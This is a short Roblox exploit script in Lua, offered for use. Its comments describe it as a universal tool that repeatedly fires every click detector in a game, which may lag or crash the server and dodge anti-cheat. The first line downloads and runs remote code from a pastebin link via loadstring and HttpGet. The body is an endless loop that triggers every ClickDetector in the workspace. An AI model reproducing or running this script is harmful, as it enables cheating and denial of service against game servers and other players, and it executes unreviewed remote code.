loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
--< Loadstring: No loadstring. To edit wait time (local ttime), check out this pastebin first which has wait time editing along with the loadstring: https://pastebin.com/raw/cZxXthEx
--< Game: Universal
--< Functionality: Allows you to repeatedly loop click every single clickdetector inside a game, which might lag or crash the server. Some anti-cheat scripts built in-game may detect this.

while true do
    repeat
        wait(ttime)
for i,v in pairs(workspace:GetDescendants()) do
            if v:IsA("ClickDetector") then
                fireclickdetector(v)
            end
        end
until false
end
